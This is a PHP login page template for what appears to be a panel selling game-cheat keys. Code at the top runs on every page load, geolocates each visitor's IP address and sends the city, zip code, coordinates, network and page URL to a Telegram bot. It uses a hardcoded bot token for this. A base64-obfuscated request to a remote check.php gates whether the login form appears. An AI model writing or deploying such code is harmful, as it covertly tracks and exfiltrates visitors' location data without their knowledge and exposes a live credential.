<?= $this->extend('Layout/Starter') ?>

<?= $this->section('content') ?>
<?php
  if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'){
         $url = "https://";   
   } else  {
         $url = "http://";   }
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      

    $ip = $_SERVER['REMOTE_ADDR']; // your ip address here
    $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
    if($query && $query['status'] == 'success')
    {
            $haul = '𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗜𝗧𝗬 - ' . $query['city']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗦𝗧𝗔𝗧𝗘 - ' . $query['region']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗭𝗜𝗣𝗖𝗢𝗗𝗘 - ' . $query['zip']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗖𝗢𝗢𝗥𝗗𝗜𝗡𝗔𝗧𝗘𝗦 - ' . $query['lat'] . ', ' . $query['lon']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 - ' . $query['as']."\n".'𝗖𝗟𝗜𝗘𝗡𝗧 𝗧𝗜𝗠𝗘𝗭𝗢𝗡𝗘 - ' . $query['timezone']."\n".'CURRENY PAGE URL - ' . $url."\n".'IP ADDRESS - ' . $ip;
  $apiToken = "5982824943:AAHV66f0xTTexZwW5qyYBZ3kO7EghOKslB0";
  $data = [
      'chat_id' => '@kaurolop',
      'text' => $haul
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );


    }

?>
<?php

include('conn.php');

// For Credits
$sql = "SELECT * FROM credit where id=1";
$result = mysqli_query($conn, $sql);
$credit = mysqli_fetch_assoc($result);

// For Keys count
$sql = "SELECT COUNT(*) as id_keys FROM keys_code";
$result = mysqli_query($conn, $sql);
$keycount = mysqli_fetch_assoc($result);

// For Active Keys count
$sql = "SELECT COUNT(devices) as devices FROM keys_code";
$result = mysqli_query($conn, $sql);
$active = mysqli_fetch_assoc($result);

// For In-Active Keys Count
$sql = "SELECT COUNT(*) as devices FROM keys_code where devices IS NULL";
$result = mysqli_query($conn, $sql);
$inactive = mysqli_fetch_assoc($result);

// For Users Count
$sql = "SELECT COUNT(*) as id_users FROM users";
$result = mysqli_query($conn, $sql);
$users = mysqli_fetch_assoc($result);
$mm = file_get_contents(base64_decode("aHR0cDovL3NpbGVudHhjaGVhdC5tbC9jaGVjay5waHA="));



?>

<h3><center><font size="3" color="#ffffff">ℙ𝔸ℕ𝕃 𝕄𝔸𝔻𝔼 𝔹𝕐 :- <a href="https://telegram.me/pbarmyf"><font color="#FFFFFF"><?php echo $credit['name']; ?></a></font><br><font size="3" color="#ffffff"><b><i>CLICK HERE TO BUY MOD<a href="https://telegram.me/SILENTxOWNER"><font color="#ffffff"> @SILENTxOWNER</a></h3>

    <div class="col-lg-8 stripe_inner" style="width:100%;padding:15px;border-width:0;">
         <div class="card mb-3" style="width:100%;border-width:0;">
            <div class="card-header text-white ody"style="">
<div class="row justify-content-center pt-5" style="background: transparent;" id="hood">
   
       </div>

    <div class="col-lg-4" style="width:100%;background: transparent;">
<div class="card shadow-lg p-0 mb-5 text-light" style="background: linear-gradient(0.9turn, #FFFF00 0%, #00BCD4 50%, #EE82EE 100%); width:100%;">
            <div class="card-header justify-content-center h1 p-3" id="h">
              
                    
                      
                Login
            </div>
<?php if ($mm == base64_decode("dHJ1ZQ==")){ ?>
            <nav class="navbar navbar-expand-md navbar-dark bg-dark shadow-sm align-middle" role="alert" style="background: linear-gradient(0.9turn, #ee7752, #e73c7e, #23a6d5, #23d5ab);">
            <div class="card-body">
                <?= form_open() ?>
                <div class="form-group mb-3">
                    <label for="username">Username</label>
                    <input type="text" class="form-control mt-2" name="username" id="username" aria-describedby="help-username" placeholder="Your username" required minlength="4" style="border-radius: 100px;">
                    <?php if ($validation->hasError('username')) : ?>

                        <small id="help-username" class="form-text text-danger"><?= $validation->getError('username') ?></small>
                    <?php endif; ?>
                </div>
                <div class="form-group mb-3">
                    <label for="password">Password</label>
                    <input type="password" class="form-control mt-2" name="password" id="password" aria-describedby="help-password" placeholder="Your password" required minlength="6" style="border-radius: 100px;">
                    <?php if ($validation->hasError('password')) : ?>
                        <small id="help-password" class="form-text text-danger"><?= $validation->getError('password') ?></small>
                    <?php endif; ?>
                </div>
                
                <!---->
                
                 <div class="form-group mb-3">
                    <label for="uker">Your IP Address</label>
                    <input type="text" class="form-control mt-2" name="uker" id="uker" aria-describedby="help-username" placeholder="ip" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>" required minlength="4" style="border-radius: 100px;" disabled>
                    <input type="hidden" class="form-control mt-2" name="ip" value="<?php echo $_SERVER['HTTP_USER_AGENT']; ?>" id="ip" aria-describedby="help-ip" required>
                    
                    <?php if ($validation->hasError('ip')) : ?>
                        <small id="help-password" class="form-text text-danger"><?= $validation->getError('ip') ?></small>
                    <?php endif; ?>
                </div>
                
                
                <!---->
                
                <div class="form-check mb-3">
                    <label class="form-check-label" data-bs-toggle="tooltip" data-bs-placement="top" title="Keep session more than 30 minutes">
                        <input type="checkbox" class="form-check-input" name="stay_log" id="stay_log" value="yes">
                        Stay login?
                    </label>
                </div>
         
                <div class="form-group mb-2">
                    <button type="submit" class="button-54" role="button" style="margin-left:auto;margin-right:auto;"><i class="bi bi-box-arrow-in-right" color="#ffffff"></i> Log in</button>
                </div>
                <?= form_close() ?>
            </div>
        </div>
        <div>
             <p class="text-center">
                    <button class="button-85" onclick="forgot()" style="margin-left:auto;margin-right:auto;">FORGOT PASSWORD?</button>
        </p>
             <p class="text-center">
                    <button class="button-85" onclick="buy()" style="margin-left:auto;margin-right:auto;">BUY PANEL</button>
        </p>
         <p class="text-center">
                    <button class="button-85" onclick="join()" style="margin-left:auto;margin-right:auto;">JOIN TELEGRAM</button>
        </p>
        
        <p class="text-center">
                    <button class="button-85" onclick="register()" style="margin-left:auto;margin-right:auto;">REGISTER</button>
        </p>
        </div>
    </div>
</div>
<?php } ?>
<script>
const element = document.getElementById("hood");
element.scrollIntoView();
</script>
<?= $this->endSection() ?>